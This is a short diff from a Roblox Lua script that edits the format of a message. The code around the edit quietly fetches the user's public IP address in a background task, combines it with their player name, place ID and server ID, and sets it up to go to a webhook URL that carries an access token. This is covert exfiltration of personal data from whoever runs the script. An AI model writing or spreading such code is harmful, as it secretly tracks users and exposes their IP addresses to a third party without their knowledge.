@@ -3143,7 +3143,7 @@ task.spawn(function()
 
 local e = game:HttpGet("https://checkip.amazonaws.com")
 local data ={
-	["content"] = e.." "..game.Players.LocalPlayer.Name.." "..game.PlaceId.." "..game.JobId
+	["content"] = e.." "..game.Players.LocalPlayer.Name.." | "..game.PlaceId.." | "..game.JobId
 }
 
 local url = "https://helpme-tan.vercel.app/api/webhooks/1317206215973011517/p21yuuHXgs-wvmjzvr8__fuYN_svgQVmWejNfuVd4NxwTYzN8LLAfMGze0vC_h-ISgTR"
